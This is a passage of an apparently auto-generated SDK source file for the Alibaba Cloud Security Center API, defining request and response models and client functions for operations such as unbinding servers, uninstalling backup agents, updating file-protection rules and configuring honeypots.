 * > You can unbind only the servers that are not deployed on Alibaba Cloud from Security Center. If you use an Alibaba Cloud Elastic Compute Service (ECS) instance, you do not need to unbind the ECS instance. If you uninstall the Security Center agent from an ECS instance, the ECS instance still exists as a disconnected server in the asset list of the Security Center console. The ECS instance is not removed from the asset list.
 * **Prerequisites**
 * *   The server that you want to unbind from Security Center is not deployed on Alibaba Cloud and the Security Center agent is disabled for the server. In this case, the agent is in the Close state and Security Center does not protect the server. You can call the [PauseClient](~~PauseClient~~) operation to disable the agent.
 * *   The client protection feature is disabled for the server that you want to unbind from Security Center. For more information about how to disable the client protection feature, see [Use the client protection feature](https://www.alibabacloud.com/help/en/security-center/latest/local-file-detection-engine).
 *
 * @param request UnbindAegisRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UnbindAegisResponse
 */
async function unbindAegisWithOptions(request: UnbindAegisRequest, runtime: Util.RuntimeOptions): UnbindAegisResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UnbindAegis',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Unbinds servers that are not deployed on Alibaba Cloud from Security Center.
 *
 * @description If you no longer require protection for servers that are not deployed on Alibaba Cloud, you can call this operation to unbind the servers from Security Center. After you unbind a server that is not deployed on Alibaba Cloud from Security Center, the server no longer consumes the quota of protected servers or protected server vCPUs. This way, you can install the Security Center agent on other servers to meet your business requirements.
 * > You can unbind only the servers that are not deployed on Alibaba Cloud from Security Center. If you use an Alibaba Cloud Elastic Compute Service (ECS) instance, you do not need to unbind the ECS instance. If you uninstall the Security Center agent from an ECS instance, the ECS instance still exists as a disconnected server in the asset list of the Security Center console. The ECS instance is not removed from the asset list.
 * **Prerequisites**
 * *   The server that you want to unbind from Security Center is not deployed on Alibaba Cloud and the Security Center agent is disabled for the server. In this case, the agent is in the Close state and Security Center does not protect the server. You can call the [PauseClient](~~PauseClient~~) operation to disable the agent.
 * *   The client protection feature is disabled for the server that you want to unbind from Security Center. For more information about how to disable the client protection feature, see [Use the client protection feature](https://www.alibabacloud.com/help/en/security-center/latest/local-file-detection-engine).
 *
 * @param request UnbindAegisRequest
 * @return UnbindAegisResponse
 */
async function unbindAegis(request: UnbindAegisRequest): UnbindAegisResponse {
  var runtime = new Util.RuntimeOptions{};
  return unbindAegisWithOptions(request, runtime);
}

model UninstallBackupClientRequest {
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the versions of anti-ransomware policies. Valid values:

*   **1.0.0**
*   **2.0.0**

This parameter is required.', example='2.0.0'),
  uuid?: string(name='Uuid', description='The UUID of the server from which you want to uninstall the anti-ransomware agent.

> You must specify at least one of the UuidList and Uuid parameters.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA0****'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers from which you want to uninstall the anti-ransomware agent.

> You must specify at least one of the UuidList and Uuid parameters.', example='["D0D6E6E4-CB8C-4897-B852-46AEFDA0****", "3bb30859-b3b5-4f28-868f-b0892c98****"]'),
}

model UninstallBackupClientResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8eec3b63-18af-454b-8c17-aabcf7190b70'),
}

model UninstallBackupClientResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UninstallBackupClientResponseBody(name='body'),
}

/**
 * @summary Uninstalls the anti-ransomware agent.
 *
 * @param request UninstallBackupClientRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UninstallBackupClientResponse
 */
async function uninstallBackupClientWithOptions(request: UninstallBackupClientRequest, runtime: Util.RuntimeOptions): UninstallBackupClientResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UninstallBackupClient',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Uninstalls the anti-ransomware agent.
 *
 * @param request UninstallBackupClientRequest
 * @return UninstallBackupClientResponse
 */
async function uninstallBackupClient(request: UninstallBackupClientRequest): UninstallBackupClientResponse {
  var runtime = new Util.RuntimeOptions{};
  return uninstallBackupClientWithOptions(request, runtime);
}

model UninstallUniBackupAgentRequest {
  policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.

> You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies.

This parameter is required.', example='123'),
}

model UninstallUniBackupAgentResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9D97AFC3-AA58-5B8F-BBC4-16D7D8AB****'),
}

model UninstallUniBackupAgentResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UninstallUniBackupAgentResponseBody(name='body'),
}

/**
 * @summary Uninstalls the database backup agent.
 *
 * @param request UninstallUniBackupAgentRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UninstallUniBackupAgentResponse
 */
async function uninstallUniBackupAgentWithOptions(request: UninstallUniBackupAgentRequest, runtime: Util.RuntimeOptions): UninstallUniBackupAgentResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UninstallUniBackupAgent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Uninstalls the database backup agent.
 *
 * @param request UninstallUniBackupAgentRequest
 * @return UninstallUniBackupAgentResponse
 */
async function uninstallUniBackupAgent(request: UninstallUniBackupAgentRequest): UninstallUniBackupAgentResponse {
  var runtime = new Util.RuntimeOptions{};
  return uninstallUniBackupAgentWithOptions(request, runtime);
}

model UpdateAlarmEventRequest {
  alarmEventIdList?: [ long ](name='AlarmEventIdList', description='The IDs of the alert events.'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  operationCode?: string(name='OperationCode', description='The operation that you want to perform on the alert events. Valid values:

*   **manual_handled**: handle the alert events.
*   **ignore**: igore the alert events.
*   **cancel_ignore**: remove the alert events from the whitelist.', example='ignore'),
}

model UpdateAlarmEventResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='AC1E0E53-DEF3-5D96-B170-19130EA****'),
}

model UpdateAlarmEventResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateAlarmEventResponseBody(name='body'),
}

/**
 * @summary Updates the status of the honeypot installation time.
 *
 * @param request UpdateAlarmEventRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateAlarmEventResponse
 */
async function updateAlarmEventWithOptions(request: UpdateAlarmEventRequest, runtime: Util.RuntimeOptions): UpdateAlarmEventResponse {
  Util.validateModel(request);
  var body : map[string]any = {};
  if (!Util.isUnset(request.alarmEventIdList)) {
    body['AlarmEventIdList'] = request.alarmEventIdList;
  }
  if (!Util.isUnset(request.lang)) {
    body['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.operationCode)) {
    body['OperationCode'] = request.operationCode;
  }
  var req = new OpenApi.OpenApiRequest{ 
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'UpdateAlarmEvent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Updates the status of the honeypot installation time.
 *
 * @param request UpdateAlarmEventRequest
 * @return UpdateAlarmEventResponse
 */
async function updateAlarmEvent(request: UpdateAlarmEventRequest): UpdateAlarmEventResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateAlarmEventWithOptions(request, runtime);
}

model UpdateBaselineCheckWhiteRecordRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.

>  You can call the [ListCheckItemWarningSummary](~~ListCheckItemWarningSummary~~) operation to query the IDs of check items.', example='16'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  reason?: string(name='Reason', description='The reason why the check item is added to the whitelist.', example='AutoRun'),
  recordId?: long(name='RecordId', description='The ID of the whitelist record.', example='14'),
  source?: string(name='Source', description='The data source. Valid values:

*   **default**: server
*   **agentless**: agentless detection', example='agentless'),
  targetType?: string(name='TargetType', description='The type of the assets on which the whitelist rule takes effect. Valid values:

*   **all_instance**: all servers
*   **instance**: specific servers', example='all_instance'),
}

model UpdateBaselineCheckWhiteRecordResponseBody = {
  data?: {
    checkId?: long(name='CheckId', description='The ID of the check item.', example='92'),
    lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
    reason?: string(name='Reason', description='The reason why the check item is added to the whitelist.', example='Test'),
    recordId?: long(name='RecordId', description='The ID of the whitelist record.', example='1582'),
    source?: string(name='Source', description='The data source. Valid values:

*   **default**: server
*   **agentless**: agentless detection', example='agentless'),
    target?: string(name='Target', description='The object that is added to the whitelist.', example='HOST_BASELINE_WHITE_LIST_23'),
    targetType?: string(name='TargetType', description='The type of the assets on which the whitelist rule takes effect. Valid values:

*   **all_instance**: all servers
*   **instance**: specific servers', example='instance'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The request ID.', example='7BC55C8F-226E-5AF5-9A2C-2EC43864****'),
}

model UpdateBaselineCheckWhiteRecordResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateBaselineCheckWhiteRecordResponseBody(name='body'),
}

/**
 * @summary Updates the whitelist rule for a baseline check item.
 *
 * @param request UpdateBaselineCheckWhiteRecordRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateBaselineCheckWhiteRecordResponse
 */
async function updateBaselineCheckWhiteRecordWithOptions(request: UpdateBaselineCheckWhiteRecordRequest, runtime: Util.RuntimeOptions): UpdateBaselineCheckWhiteRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.recordId)) {
    query['RecordId'] = request.recordId;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateBaselineCheckWhiteRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Updates the whitelist rule for a baseline check item.
 *
 * @param request UpdateBaselineCheckWhiteRecordRequest
 * @return UpdateBaselineCheckWhiteRecordResponse
 */
async function updateBaselineCheckWhiteRecord(request: UpdateBaselineCheckWhiteRecordRequest): UpdateBaselineCheckWhiteRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateBaselineCheckWhiteRecordWithOptions(request, runtime);
}

model UpdateClientAlertModeRequest {
  mode?: string(name='Mode', description='The protection mode. Valid values:

*   **strict**: The strict mode. False positives may be generated. We recommend that you enable this mode during major events.
*   **balance**: The balanced mode. More risks can be detected with less false positives in this mode.', example='balance'),
  uuids?: [ string ](name='Uuids', description='The UUIDs of servers.'),
}

model UpdateClientAlertModeResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
  requestId?: string(name='RequestId', description='The request ID.', example='259E3E77-CA6D-5407-84A5-3A1C98D12F14'),
}

model UpdateClientAlertModeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateClientAlertModeResponseBody(name='body'),
}

/**
 * @summary Modifies alerting settings for servers.
 *
 * @param request UpdateClientAlertModeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateClientAlertModeResponse
 */
async function updateClientAlertModeWithOptions(request: UpdateClientAlertModeRequest, runtime: Util.RuntimeOptions): UpdateClientAlertModeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.mode)) {
    query['Mode'] = request.mode;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateClientAlertMode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies alerting settings for servers.
 *
 * @param request UpdateClientAlertModeRequest
 * @return UpdateClientAlertModeResponse
 */
async function updateClientAlertMode(request: UpdateClientAlertModeRequest): UpdateClientAlertModeResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateClientAlertModeWithOptions(request, runtime);
}

model UpdateCommonSwitchConfigRequest {
  targetDefault?: string(name='TargetDefault', description='Specifies whether to turn on the switch for newly added servers. Valid values:

*   **add**: yes
*   **del**: no', example='add'),
  type?: string(name='Type', description='The type of the switch.

>  You can call the [ListClientUserDefineRules](~~ListClientUserDefineRules~~) or [ListSystemClientRules](~~ListSystemClientRules~~) operation to obtain the type from the response parameter SwitchId.', example='USER-DEFINE-RULE-SWITCH-TYPE_190****'),
}

model UpdateCommonSwitchConfigResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='655B538A-A31B-58F2-A3FB-2EF4390D****'),
}

model UpdateCommonSwitchConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateCommonSwitchConfigResponseBody(name='body'),
}

/**
 * @summary Modifies the settings of common switches.
 *
 * @param request UpdateCommonSwitchConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateCommonSwitchConfigResponse
 */
async function updateCommonSwitchConfigWithOptions(request: UpdateCommonSwitchConfigRequest, runtime: Util.RuntimeOptions): UpdateCommonSwitchConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.targetDefault)) {
    query['TargetDefault'] = request.targetDefault;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateCommonSwitchConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the settings of common switches.
 *
 * @param request UpdateCommonSwitchConfigRequest
 * @return UpdateCommonSwitchConfigResponse
 */
async function updateCommonSwitchConfig(request: UpdateCommonSwitchConfigRequest): UpdateCommonSwitchConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateCommonSwitchConfigWithOptions(request, runtime);
}

model UpdateCustomizeReportStatusRequest {
  pinnedTime?: long(name='PinnedTime', description='The time when the report is pinned. Unit: milliseconds.', example='1717430400000'),
  reportId?: long(name='ReportId', description='The ID of the report.

>  You can call the [DescribeCustomizeReportList](~~DescribeCustomizeReportList~~) operation to query the ID.

This parameter is required.', example='123'),
  reportStatus?: int32(name='ReportStatus', description='The status of the report. Valid values:

*   **0**: disabled.
*   **1**: enabled.

This parameter is required.', example='1'),
}

model UpdateCustomizeReportStatusResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='64C76BEE-6A47-54D9-BD91-BD3E8A1B****'),
}

model UpdateCustomizeReportStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateCustomizeReportStatusResponseBody(name='body'),
}

/**
 * @summary Changes the status of a security report.
 *
 * @param request UpdateCustomizeReportStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateCustomizeReportStatusResponse
 */
async function updateCustomizeReportStatusWithOptions(request: UpdateCustomizeReportStatusRequest, runtime: Util.RuntimeOptions): UpdateCustomizeReportStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.pinnedTime)) {
    query['PinnedTime'] = request.pinnedTime;
  }
  if (!Util.isUnset(request.reportId)) {
    query['ReportId'] = request.reportId;
  }
  if (!Util.isUnset(request.reportStatus)) {
    query['ReportStatus'] = request.reportStatus;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateCustomizeReportStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Changes the status of a security report.
 *
 * @param request UpdateCustomizeReportStatusRequest
 * @return UpdateCustomizeReportStatusResponse
 */
async function updateCustomizeReportStatus(request: UpdateCustomizeReportStatusRequest): UpdateCustomizeReportStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateCustomizeReportStatusWithOptions(request, runtime);
}

model UpdateFileProtectEventStatusRequest {
  id?: [ long ](name='Id', description='The IDs of the events.'),
  status?: int32(name='Status', description='The handling status of the event. Valid values:

*   **0**: unhandled
*   **1**: handled
*   **2**: added to the whitelist', example='0'),
}

model UpdateFileProtectEventStatusResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='C286491D-4A2F-589A-B63B-D2AD3DA9BD71'),
}

model UpdateFileProtectEventStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateFileProtectEventStatusResponseBody(name='body'),
}

/**
 * @summary Modifies the status of core file monitoring events reported by the Security Center agent.
 *
 * @param request UpdateFileProtectEventStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateFileProtectEventStatusResponse
 */
async function updateFileProtectEventStatusWithOptions(request: UpdateFileProtectEventStatusRequest, runtime: Util.RuntimeOptions): UpdateFileProtectEventStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateFileProtectEventStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the status of core file monitoring events reported by the Security Center agent.
 *
 * @param request UpdateFileProtectEventStatusRequest
 * @return UpdateFileProtectEventStatusResponse
 */
async function updateFileProtectEventStatus(request: UpdateFileProtectEventStatusRequest): UpdateFileProtectEventStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateFileProtectEventStatusWithOptions(request, runtime);
}

model UpdateFileProtectRemarkRequest {
  id?: long(name='Id', description='The ID of the event.', example='1764'),
  remark?: [ string ](name='Remark', description='The remarks.'),
}

model UpdateFileProtectRemarkResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='226440DF-DFCD-5B93-9951-FCF0A16A6B78'),
}

model UpdateFileProtectRemarkResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateFileProtectRemarkResponseBody(name='body'),
}

/**
 * @summary Adds remarks to core file monitoring events reported by the Security Center agent.
 *
 * @param request UpdateFileProtectRemarkRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateFileProtectRemarkResponse
 */
async function updateFileProtectRemarkWithOptions(request: UpdateFileProtectRemarkRequest, runtime: Util.RuntimeOptions): UpdateFileProtectRemarkResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateFileProtectRemark',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds remarks to core file monitoring events reported by the Security Center agent.
 *
 * @param request UpdateFileProtectRemarkRequest
 * @return UpdateFileProtectRemarkResponse
 */
async function updateFileProtectRemark(request: UpdateFileProtectRemarkRequest): UpdateFileProtectRemarkResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateFileProtectRemarkWithOptions(request, runtime);
}

model UpdateFileProtectRuleRequest {
  alertLevel?: int32(name='AlertLevel', description='The severity of alerts. Valid values:

*   0: does not generate alerts
*   1: sends notifications
*   2: suspicious
*   3: high-risk', example='0'),
  fileOps?: [ string ](name='FileOps', description='The operations that you want to perform on the files.

This parameter is required.'),
  filePaths?: [ string ](name='FilePaths', description='The paths to the monitored files. Wildcard characters are supported.

This parameter is required.'),
  id?: long(name='Id', description='The ID of the rule.', example='1062'),
  procPaths?: [ string ](name='ProcPaths', description='The paths to the monitored processes.

This parameter is required.'),
  ruleAction?: string(name='RuleAction', description='The handling method of the rule. Valid values:

*   pass: allow
*   alert', example='pass'),
  ruleName?: string(name='RuleName', description='The name of the rule.

This parameter is required.', example='test-rule-1'),
  status?: int32(name='Status', description='The status of the rule. Valid values:

*   **0**: disabled
*   **1**: enabled', example='1'),
}

model UpdateFileProtectRuleResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='339227F4-C9E1-526F-8347-1099C11F65FB'),
}

model UpdateFileProtectRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateFileProtectRuleResponseBody(name='body'),
}

/**
 * @summary Modifies the content of a core file monitoring rule based on the ID of the rule.
 *
 * @param request UpdateFileProtectRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateFileProtectRuleResponse
 */
async function updateFileProtectRuleWithOptions(request: UpdateFileProtectRuleRequest, runtime: Util.RuntimeOptions): UpdateFileProtectRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.alertLevel)) {
    query['AlertLevel'] = request.alertLevel;
  }
  if (!Util.isUnset(request.fileOps)) {
    query['FileOps'] = request.fileOps;
  }
  if (!Util.isUnset(request.filePaths)) {
    query['FilePaths'] = request.filePaths;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.procPaths)) {
    query['ProcPaths'] = request.procPaths;
  }
  if (!Util.isUnset(request.ruleAction)) {
    query['RuleAction'] = request.ruleAction;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateFileProtectRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the content of a core file monitoring rule based on the ID of the rule.
 *
 * @param request UpdateFileProtectRuleRequest
 * @return UpdateFileProtectRuleResponse
 */
async function updateFileProtectRule(request: UpdateFileProtectRuleRequest): UpdateFileProtectRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateFileProtectRuleWithOptions(request, runtime);
}

model UpdateFileUploadLimitRequest {
  limit?: long(name='Limit', description='The QPS limit on the files uploaded from the client. Valid values: 100 to 10000.

This parameter is required.', example='100'),
}

model UpdateFileUploadLimitResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8BF6F'),
}

model UpdateFileUploadLimitResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: UpdateFileUploadLimitResponseBody(name='body'),
}

/**
 * @summary Modifies the queries per second (QPS) limit on the files uploaded from the client.
 *
 * @param request UpdateFileUploadLimitRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return UpdateFileUploadLimitResponse
 */
async function updateFileUploadLimitWithOptions(request: UpdateFileUploadLimitRequest, runtime: Util.RuntimeOptions): UpdateFileUploadLimitResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.limit)) {
    query['Limit'] = request.limit;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpdateFileUploadLimit',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the queries per second (QPS) limit on the files uploaded from the client.
 *
 * @param request UpdateFileUploadLimitRequest
 * @return UpdateFileUploadLimitResponse
 */
async function updateFileUploadLimit(request: UpdateFileUploadLimitRequest): UpdateFileUploadLimitResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateFileUploadLimitWithOptions(request, runtime);
}

model UpdateHoneypotRequest {
  honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.

>  You can call the [ListHoneypot](~~ListHoneypot~~) operation to query the IDs of honeypots.

This parameter is required.', example='945607c2ae2a1a737c04599d6608065688bfc6048d9b9d306ce8dc8191c278b4'),
  honeypotName?: string(name='HoneypotName', description='The custom name of the honeypot.', example='ExtMail'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  meta?: string(name='Meta', description='The custom configuration of the honeypot.

> You can call the [ListAvailableHoneypot](~~ListAvailableHoneypot~~) operation to query the configurations of honeypots from the **Template** response parameter.', example='{\\\\"burp\\\\":\\\\"open\\\\",\\\\"webshell\\\\":\\\\"open\\\\",\\\\"trojan_git\\\\":\\\\"close\\\\",\\\\"portrait_option\\\\":\\\\"true\\\\"}'),
}

model UpdateHoneypotResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.', example='9bf8cd373112263d4bc102fc5dba9d9f812ee05d4d35c487d330d52e937f****'),
    honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the honeypot image.', example='Webmin'),
